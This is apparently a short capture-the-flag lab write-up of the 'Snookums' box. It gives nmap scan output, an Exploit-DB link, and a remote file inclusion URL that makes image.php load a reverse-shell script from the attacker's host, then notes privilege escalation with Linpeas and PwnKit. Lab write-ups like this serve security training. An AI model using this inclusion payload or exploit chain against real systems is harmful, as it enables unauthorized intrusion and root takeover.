```
nmap -sC -sV 192.168.207.58  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 09:57 CDT
Nmap scan report for 192.168.207.58
Host is up (0.044s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a796712c7ec133a96bdd3b47cf39515 (RSA)
|   256 a8a3a788cf3727b54d451379dbd2bacb (ECDSA)
|_  256 f20713191f29de19487cdb4599f9cd3e (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
|_clock-skew: mean: 1h20m20s, deviation: 2h18m36s, median: 18s
| smb2-time: 
|   date: 2023-07-24T14:58:29
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2023-07-24T10:58:32-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.02 seconds

```

https://www.exploit-db.com/exploits/48424

```
http://192.168.207.58/image.php?img=http://192.168.45.216/rev2.php
```

Got a reverse shell on port 21.

Ran Linpeas and found I could get root with pwnkit. Ran that and got root.